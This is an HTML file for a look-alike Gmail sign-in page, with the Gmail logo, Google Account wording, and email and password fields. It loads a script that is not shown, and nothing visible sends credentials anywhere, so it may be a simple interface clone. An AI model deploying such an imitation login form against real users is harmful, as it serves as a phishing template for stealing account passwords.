<!Doctype html>
<html>
    <head>
        <link rel="stylesheet" href="style.css">
        <title>Gmail</title>
        <meta name="viewport" content="width-device-width, initial-scale=1.0">
    </head>
    <body>
        <div class="container1">
            <img src="gmail_logo.png" alt="gmail_logo" width="100px" height="50px">
            <h1>Sign in</h1>
            <h3>Use your Google Account</h3>
            <form id="loginFom">
                <label for="email">Email or Phone</label><br>
                <input type="email" id="email" placeholder="example@gmail.com" required><br><br>
                <label for="password">Password</label><br>
                <input type="password" id="password" placeholder="Enter your password" required><br><br>
                <div class="links">
                    <a href="#">Forgot Email</a>
                    <a href="#">Create Account</a>
                </div><br>
                <button type="submit" id="loginButton">Login</button>
            </form>
        </div>
        <script src="script.js"></script>
    </body>
</html>
